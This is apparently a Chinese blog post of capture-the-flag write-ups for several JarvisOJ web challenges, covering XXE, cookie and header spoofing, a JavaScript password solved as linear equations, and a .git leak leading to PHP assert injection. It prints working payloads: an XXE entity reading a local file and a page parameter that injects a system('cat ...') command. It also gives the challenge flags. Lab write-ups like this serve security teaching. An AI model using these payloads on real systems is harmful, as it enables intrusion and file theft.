<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="“一个不像二进制同学的博客。”"><title>CTf-JarvisOJ-100-200 | f01965</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = 'https://hm.baidu.com/hm.js?' + 'true';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
  </script></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CTf-JarvisOJ-100-200</h1><a id="logo" href="/.">f01965</a><p class="description">初闻不知曲中意，再听已是曲中人。</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CTf-JarvisOJ-100-200</h1><div class="post-meta">Mar 10, 2020<script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span></div><a class="disqus-comment-count" href="/2020/03/10/CTf-JarvisOJ-100-200/#vcomment"><span class="valine-comment-count" data-xid="/2020/03/10/CTf-JarvisOJ-100-200/"></span><span> 条评论</span></a><div class="post-content"><h3 id="WriteUp-中所有内容和知识点均来源于参考资料的师傅们。"><a href="#WriteUp-中所有内容和知识点均来源于参考资料的师傅们。" class="headerlink" title="WriteUp 中所有内容和知识点均来源于参考资料的师傅们。"></a>WriteUp 中所有内容和知识点均来源于参考资料的师傅们。</h3><h2 id="API调用-100"><a href="#API调用-100" class="headerlink" title="API调用 100"></a>API调用 100</h2><p>URL: <a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
<h3 id="查看网页源码"><a href="#查看网页源码" class="headerlink" title="查看网页源码"></a>查看网页源码</h3><p>Script 脚本部分如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function XHR() &#123;</span><br><span class="line">        var xhr;</span><br><span class="line">        try &#123;xhr = new XMLHttpRequest();&#125;</span><br><span class="line">        catch(e) &#123;</span><br><span class="line">            var IEXHRVers =[&quot;Msxml3.XMLHTTP&quot;,&quot;Msxml2.XMLHTTP&quot;,&quot;Microsoft.XMLHTTP&quot;];</span><br><span class="line">            for (var i=0,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                try &#123;xhr = new ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                catch(e) &#123;continue;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function send()&#123;</span><br><span class="line"> evil_input = document.getElementById(&quot;evil-input&quot;).value;</span><br><span class="line"> var xhr = XHR();</span><br><span class="line"> xhr.open(&quot;post&quot;,&quot;/api/v1.0/try&quot;,true);</span><br><span class="line"> xhr.onreadystatechange = function () &#123;</span><br><span class="line">        if (xhr.readyState==4 &amp;&amp; xhr.status==201) &#123;</span><br><span class="line">            data = JSON.parse(xhr.responseText);  // json格式</span><br><span class="line">            tip_area = document.getElementById(&quot;tip-area&quot;);</span><br><span class="line">            tip_area.value = data.task.search+data.task.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"> xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;);</span><br><span class="line"> xhr.send(&apos;&#123;&quot;search&quot;:&quot;&apos;+evil_input+&apos;&quot;,&quot;value&quot;:&quot;own&quot;&#125;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>上面的js代码，作用就是把我们输入的数据，用json打包发送过去。</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>本题的考点就是 XXE 漏洞的利用。<br><a href="https://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/126788.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
<p>这道题默认以json 发送数据。<br>修改 Content-Type<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">content-type</span><br><span class="line">MediaType，即是Internet Media   </span><br><span class="line">Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。</span><br><span class="line"></span><br><span class="line">常见的媒体格式类型如下：</span><br><span class="line">text/html ： HTML格式</span><br><span class="line">text/plain ：纯文本格式</span><br><span class="line">text/xml ： XML格式</span><br><span class="line">image/gif ：gif图片格式</span><br><span class="line">image/jpeg ：jpg图片格式</span><br><span class="line">image/png：png图片格式</span><br><span class="line">以application开头的媒体格式类型：</span><br><span class="line">application/xhtml+xml ：XHTML格式</span><br><span class="line">application/xml ： XML数据格式</span><br><span class="line">application/atom+xml ：Atom XML聚合格式</span><br><span class="line">application/json ： JSON数据格式</span><br><span class="line">application/pdf ：pdf格式</span><br><span class="line">application/msword ： Word文档格式</span><br><span class="line">application/octet-stream ： 二进制流数据（如常见的文档下载）</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
<p>那么，发送数据应该是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [ </span><br><span class="line">    &lt;!ENTITY data SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;data;&lt;/c&gt;</span><br></pre></td></tr></table></figure></p>
<p>最终发送数据如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1.0/try HTTP/1.1</span><br><span class="line">Host: web.jarvisoj.com:9882</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: test/xml</span><br><span class="line">Content-Length: 111</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://web.jarvisoj.com:9882/</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [ </span><br><span class="line">    &lt;!ENTITY data SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;data;&lt;/c&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到回包，包含flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 38</span><br><span class="line">Server: Werkzeug/0.9.4 Python/2.7.6</span><br><span class="line">Date: Fri, 06 Mar 2020 08:16:53 GMT</span><br><span class="line"></span><br><span class="line">&lt;c&gt;CTF&#123;XxE_15_n0T_S7range_Enough&#125;</span><br><span class="line">&lt;/c&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="admin-100"><a href="#admin-100" class="headerlink" title="admin 100"></a>admin 100</h2><p>URL: <a href="http://web.jarvisoj.com:32792/" target="_blank" rel="noopener">http://web.jarvisoj.com:32792/</a><br>页面只有一个 hello world ，那么扫它的目录。<br>先发一次包，burp抓到然后右键 send to sprider ，可以扫到一个 robots.txt 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">robots.txt 文件</span><br><span class="line">参考链接：https://zh.wikipedia.org/wiki/Robots.txt   </span><br><span class="line">存放于网站根目录下的ASCII编码的文本文件。</span><br></pre></td></tr></table></figure></p>
<p>robots.txt文件中有个 admin_s3cr3t.php<br>访问一下，显示了一个假的flag。抓包，send to R 发现有个admin = 0 的字段，该admin=1得到一个flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 06 Mar 2020 08:53:19 GMT</span><br><span class="line">Server: Apache/2.4.18 (Unix) OpenSSL/1.0.2h PHP/5.6.21 mod_perl/2.0.8-dev Perl/v5.16.3</span><br><span class="line">X-Powered-By: PHP/5.6.21</span><br><span class="line">Set-Cookie: admin=0</span><br><span class="line">Content-Length: 21</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">flag&#123;hello_admin~&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="PORT51-100"><a href="#PORT51-100" class="headerlink" title="PORT51 100"></a>PORT51 100</h2><p>URL：<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br>题目让我用51端口去访问。那么到kali下，用命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --local-port 51  http://web.jarvisoj.com:32770/</span><br><span class="line">PCTF&#123;M45t3r_oF_CuRl&#125;</span><br></pre></td></tr></table></figure></p>
<p>参考链接：<br><a href="https://www.cnblogs.com/duhuo/p/5695256.html" target="_blank" rel="noopener">https://www.cnblogs.com/duhuo/p/5695256.html</a>   </p>
<h2 id="LOCALHOST-150"><a href="#LOCALHOST-150" class="headerlink" title="LOCALHOST 150"></a>LOCALHOST 150</h2><p>URL: <a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a>    </p>
<p>题目说要localhost，意思也就是说要本地访问。<br>那么http头中 X-Forwarded-For 可以指出当前的客户IP。   </p>
<p>参考链接：<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For</a><br><a href="https://www.jianshu.com/p/792048d08ebc" target="_blank" rel="noopener">https://www.jianshu.com/p/792048d08ebc</a></p>
<p>发送<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: web.jarvisoj.com:32774</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 </span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h3&gt;Yeah!! Here&apos;s your flag:PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;&lt;/h3&gt;	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="WEB-150"><a href="#WEB-150" class="headerlink" title="WEB? 150"></a>WEB? 150</h2><p>URL：<a href="http://web.jarvisoj.com:9891/" target="_blank" rel="noopener">http://web.jarvisoj.com:9891/</a></p>
<p>题目让输入密码，也就是找密码了。输入错误，则返回Wrong Password!!<br>查看源码，可以看到有个可疑的app.js，里面代码居多。直接搜索 Wrong Password!!<br>找到关键的函数，仔细看就是加密的部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">value:function(e)&#123;</span><br><span class="line">	if(25!==e.length)</span><br><span class="line">		return!1;</span><br><span class="line">	for(var t=[],n=0;n&lt;25;n++)</span><br><span class="line">		t.push(e.charCodeAt(n));</span><br><span class="line">	for(var r=[325799, ... ],</span><br><span class="line">	o=[[11, ...],</span><br><span class="line">	...],n=0;n&lt;25;n++)</span><br><span class="line">	&#123;</span><br><span class="line">		for(var i=0,a=0;a&lt;25;a++)</span><br><span class="line">			i+=t[a]*o[n][a];</span><br><span class="line">		if(i!==r[n])</span><br><span class="line">			return!1</span><br><span class="line">	&#125;</span><br><span class="line">	return!0</span><br><span class="line">&#125;,&#125;</span><br><span class="line">o 多维数组，r 是一维</span><br><span class="line">相当于解线性方程 b = x*a; x = b/a;</span><br><span class="line">r[n] = t[a]*o[n][a];</span><br><span class="line">t[a] = r[n] / o[n][a];</span><br></pre></td></tr></table></figure></p>
<p>python 提供了解线性方程的方法：<br><a href="https://blog.csdn.net/HackerTom/article/details/98519196" target="_blank" rel="noopener">https://blog.csdn.net/HackerTom/article/details/98519196</a><br><a href="https://zhuanlan.zhihu.com/p/24893371" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24893371</a><br>脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># utf-8</span><br><span class="line"># python-3</span><br><span class="line">import numpy </span><br><span class="line">r = numpy.array([325799,309234,317320,327895,298316,301249,330242,289290,273446,337687,258725,267444,373557,322237,344478,362136,331815,315157,299242,305418,313569,269307,338319,306491,351259])</span><br><span class="line">o=numpy.array([[11,13,32,234,236,3,72,237,122,230,157,53,7,225,193,76,142,166,11,196,194,187,152,132,135],</span><br><span class="line">	[76,55,38,70,98,244,201,125,182,123,47,86,67,19,145,12,138,149,83,178,255,122,238,187,221],</span><br><span class="line">	[218,233,17,56,151,28,150,196,79,11,150,128,52,228,189,107,219,87,90,221,45,201,14,106,230],</span><br><span class="line">	[30,50,76,94,172,61,229,109,216,12,181,231,174,236,159,128,245,52,43,11,207,145,241,196,80],</span><br><span class="line">	[134,145,36,255,13,239,212,135,85,194,200,50,170,78,51,10,232,132,60,122,117,74,117,250,45],</span><br><span class="line">	[142,221,121,56,56,120,113,143,77,190,195,133,236,111,144,65,172,74,160,1,143,242,96,70,107],</span><br><span class="line">	[229,79,167,88,165,38,108,27,75,240,116,178,165,206,156,193,86,57,148,187,161,55,134,24,249],</span><br><span class="line">	[235,175,235,169,73,125,114,6,142,162,228,157,160,66,28,167,63,41,182,55,189,56,102,31,158],</span><br><span class="line">	[37,190,169,116,172,66,9,229,188,63,138,111,245,133,22,87,25,26,106,82,211,252,57,66,98],</span><br><span class="line">	[199,48,58,221,162,57,111,70,227,126,43,143,225,85,224,141,232,141,5,233,69,70,204,155,141],</span><br><span class="line">	[212,83,219,55,132,5,153,11,0,89,134,201,255,101,22,98,215,139,0,78,165,0,126,48,119],</span><br><span class="line">	[194,156,10,212,237,112,17,158,225,227,152,121,56,10,238,74,76,66,80,31,73,10,180,45,94],</span><br><span class="line">	[110,231,82,180,109,209,239,163,30,160,60,190,97,256,141,199,3,30,235,73,225,244,141,123,208],</span><br><span class="line">	[220,248,136,245,123,82,120,65,68,136,151,173,104,107,172,148,54,218,42,233,57,115,5,50,196],</span><br><span class="line">	[190,34,140,52,160,34,201,48,214,33,219,183,224,237,157,245,1,134,13,99,212,230,243,236,40],</span><br><span class="line">	[144,246,73,161,134,112,146,212,121,43,41,174,146,78,235,202,200,90,254,216,113,25,114,232,123],</span><br><span class="line">	[158,85,116,97,145,21,105,2,256,69,21,152,155,88,11,232,146,238,170,123,135,150,161,249,236],</span><br><span class="line">	[251,96,103,188,188,8,33,39,237,63,230,128,166,130,141,112,254,234,113,250,1,89,0,135,119],</span><br><span class="line">	[192,206,73,92,174,130,164,95,21,153,82,254,20,133,56,7,163,48,7,206,51,204,136,180,196],</span><br><span class="line">	[106,63,252,202,153,6,193,146,88,118,78,58,214,168,68,128,68,35,245,144,102,20,194,207,66],</span><br><span class="line">	[154,98,219,2,13,65,131,185,27,162,214,63,238,248,38,129,170,180,181,96,165,78,121,55,214],</span><br><span class="line">	[193,94,107,45,83,56,2,41,58,169,120,58,105,178,58,217,18,93,212,74,18,217,219,89,212],</span><br><span class="line">	[164,228,5,133,175,164,37,176,94,232,82,0,47,212,107,111,97,153,119,85,147,256,130,248,235],</span><br><span class="line">	[221,178,50,49,39,215,200,188,105,101,172,133,28,88,83,32,45,13,215,204,141,226,118,233,156],</span><br><span class="line">	[236,142,87,152,97,134,54,239,49,220,233,216,13,143,145,112,217,194,114,221,150,51,136,31,198]])</span><br><span class="line">x = numpy.linalg.solve(o, r)   # 解出的 x 是浮点数，</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in x:</span><br><span class="line">    flag+= chr(int(round(i))) # round()  方法返回浮点数 x 的四舍五入值。</span><br><span class="line">print(flag)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure></p>
<p>QWB{R3ac7_1s_interesting}</p>
<h2 id="babyphp-200"><a href="#babyphp-200" class="headerlink" title="babyphp 200"></a>babyphp 200</h2><p>题目是个网站，用burpsuite扫一下目录，看到有个flag页面，但是被注释了。<br>根据人家wp，说这个是git信息泄露。用 githack 可以down下代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考：https://github.com/lijiejie/GitHack</span><br><span class="line">python GitHack.py http://web.jarvisoj.com:32798/.git/</span><br></pre></td></tr></table></figure></p>
<p>下载后，查看 index.php，发现参数 home 可以注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">源码如下：</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">	$page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br></pre></td></tr></table></figure></p>
<p>其中assert是个危险函数，其原型为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool assert ( mixed $assertion [, string $description ] )</span><br></pre></td></tr></table></figure></p>
<p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br><a href="http://www.beesfun.com/2017/04/18/PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%92%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">php注入参考</a></p>
<p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=flag&apos;.system(&quot;cat templates/flag.php;&quot;).&apos;</span><br></pre></td></tr></table></figure></p>
<p>页面返回 That file doesn’t exist!<br>查看源码得到flag。</p>
</div><iframe src="/donate/?AliPayQR=null&amp;WeChatQR=/img/mePic.jpg&amp;GitHub=null&amp;BTCQR=null&amp;BTCKEY=null&amp;PayPal=null" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div class="tags"><a href="/tags/CTF-web/">CTF-web</a></div><div class="post-nav"><a class="pre" href="/2020/03/10/CTf-JarvisOJ-250-300/">CTf-JarvisOJ-250-300</a><a class="next" href="/2020/02/26/cJson源码分析/">cJson源码分析</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'o3qEIvAEzJfA0jPzjvyVeUwo-gzGzoHsz',
  appKey:'VBV3VN2vtqwbGqHGFeNL86iw',
  placeholder:'thanks for you read',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="https://f01965.github.io"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CVE-2018/">CVE / 2018</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/技术分享/">技术分享</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/日志/">日志</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/漏洞利用/" style="font-size: 15px;">漏洞利用</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/CTF-web/" style="font-size: 15px;">CTF-web</a> <a href="/tags/机器学习框架/" style="font-size: 15px;">机器学习框架</a> <a href="/tags/GC/" style="font-size: 15px;">GC</a> <a href="/tags/技术分享/" style="font-size: 15px;">技术分享</a> <a href="/tags/Mircosoft/" style="font-size: 15px;">Mircosoft</a> <a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/固件/" style="font-size: 15px;">固件</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/CVE-2017-17215/">CVE-2017-17215</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/18/Cisco-IOS-分析/">Cisco-IOS 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/28/Chrome-沙盒逃逸/">Chrome 沙盒逃逸</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/30/iseaCMS/">iseaCMS</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/16/BUCTF-web14-20/">BUCTF.web.14-20</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/BUUCTF-Web-1-14/">BUUCTF.web.1-13</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/CTf-JarvisOJ-250-300/">CTf-JarvisOJ-250-300</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/10/CTf-JarvisOJ-100-200/">CTf-JarvisOJ-100-200</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/26/cJson源码分析/">cJson源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/22/openwrt-uncompress/">firmware-uncompress</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://yan-1-20.github.io/about/" title="Asprose" target="_blank">Asprose</a><ul></ul><a href="https://www.lucifaer.com/" title="Lucifaer" target="_blank">Lucifaer</a><ul></ul><a href="http://drac0nids.top/" title="Drac0nids" target="_blank">Drac0nids</a><ul></ul><a href="http://balis0ng.com/" title="balis0ng" target="_blank">balis0ng</a><ul></ul><a href="https://da7uran0ir.github.io/" title="Da7ura_n0ir" target="_blank">Da7ura_n0ir</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"> Dad ， I will always love you.</div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" color="255,0,0" opacity="0.7" zIndex="-1" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>